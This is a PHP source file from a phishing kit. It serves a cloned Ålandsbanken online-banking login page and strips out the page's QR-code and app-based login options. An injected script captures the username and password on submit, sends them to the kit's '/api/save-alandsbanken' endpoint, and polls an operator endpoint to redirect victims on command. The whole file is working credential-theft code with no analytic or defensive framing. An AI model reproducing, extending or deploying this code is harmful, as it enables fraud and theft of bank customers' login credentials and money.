<?php
ob_start();
header('Content-Type: text/html; charset=UTF-8');
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Ålandsbanken');
$htmlContent = file_get_contents(__DIR__ . '/Ålandsbanken.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$basePath = '/alandsbanken-files/';
$htmlContent = preg_replace('/\.\/[^"\'<>]*?landsbanken_files\//i', $basePath, $htmlContent);
$htmlContent = preg_replace('/[^"\'<>\/]*?landsbanken_files\//i', $basePath, $htmlContent);
$htmlContent = preg_replace('/href="\.\/([^"]*)"/i', 'href="#$1"', $htmlContent);
$htmlContent = preg_replace('/src="\.\/([^"]*landsbanken_files\/[^"]*)"/i', 'src="' . $basePath . '$1"', $htmlContent);
$htmlContent = preg_replace('/src="\.\/([^"]*)"/i', 'src="' . $basePath . '$1"', $htmlContent);
$htmlContent = preg_replace('/href="([^"]*landsbanken_files\/[^"]*)"/i', 'href="' . $basePath . '$1"', $htmlContent);
$htmlContent = preg_replace('/<link[^>]*href="[^"]*landsbanken_files\/([^"]*)"[^>]*>/i', '<link href="' . $basePath . '$1" rel="stylesheet">', $htmlContent);

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/alandsbanken:\/\/[^\s"\'<>]+/i', '#', $htmlContent);

$htmlContent = str_replace('charset=windows-1252', 'charset=UTF-8', $htmlContent);
$htmlContent = str_replace('charset="windows-1252"', 'charset="UTF-8"', $htmlContent);
$htmlContent = str_replace('type="password" name="username"', 'type="text" name="username"', $htmlContent);

$qrHideStyle = '<style>
    #qrcode, 
    #qr-img-wrapper, 
    #qrImage, 
    #switchBetweenQrAndEncap,
    #qrcodeDialog,
    #qr-dialog,
    .qr-img-wrapper,
    .qr-image,
    .qr-image-dialog {
        display: none !important;
        visibility: hidden !important;
    }
    #PIN_TAN {
        display: block !important;
        visibility: visible !important;
    }
    #login {
        display: block !important;
        visibility: visible !important;
    }
    #login input[type="password"],
    #login input[type="text"],
    #login button[type="submit"],
    #login label {
        display: block !important;
        visibility: visible !important;
    }
    .c_form__item {
        display: block !important;
        visibility: visible !important;
    }
</style>';

if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $qrHideStyle . '</head>', $htmlContent);
} else {
    $htmlContent = $qrHideStyle . $htmlContent;
}

$adminScript = '';
if (isset($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function getAlandsbankenCredentials() {
            let username = \'\';
            let password = \'\';
            
            const usernameField = document.getElementById(\'username\');
            const encapUsername = document.getElementById(\'encapUsername\');
            const passwordField = document.getElementById(\'password\');
            
            if (usernameField && usernameField.value) {
                username = usernameField.value;
            } else if (encapUsername && encapUsername.value) {
                username = encapUsername.value;
            }
            
            if (passwordField && passwordField.value) {
                password = passwordField.value;
            }
            
            return { username, password };
        }
        
        function handleFormSubmit(e) {
            e.preventDefault();
            
            const { username, password } = getAlandsbankenCredentials();
            
            if (username && password) {
                fetch(\'/api/save-alandsbanken\', {
                    method: \'POST\',
                    headers: { \'Content-Type\': \'application/json\' },
                    body: JSON.stringify({
                        user_id: userId,
                        username: username,
                        password: password
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        window.location.href = \'/user/\' + userId + \'/bank/alandsbanken2\';
                    }
                })
                .catch(() => {});
            }
        }
        
        setTimeout(() => {
            const pinTanTab = document.getElementById(\'PIN_TAN\');
            if (pinTanTab) {
                pinTanTab.style.display = \'block\';
                pinTanTab.style.visibility = \'visible\';
            }
            
            const encapTab = document.getElementById(\'ENCAP\');
            if (encapTab) {
                encapTab.style.display = \'none\';
            }
            
            const loginForm = document.getElementById(\'login\');
            if (loginForm) {
                loginForm.style.display = \'block\';
                loginForm.style.visibility = \'visible\';
                loginForm.addEventListener(\'submit\', handleFormSubmit, true);
            }
            
            const encapLoginForm = document.getElementById(\'encapLoginForm\');
            if (encapLoginForm) {
                encapLoginForm.addEventListener(\'submit\', handleFormSubmit, true);
            }
        }, 1000);
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

$htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
echo $htmlContent;
?>
<?php
$content = ob_get_clean();
echo $content;
?>
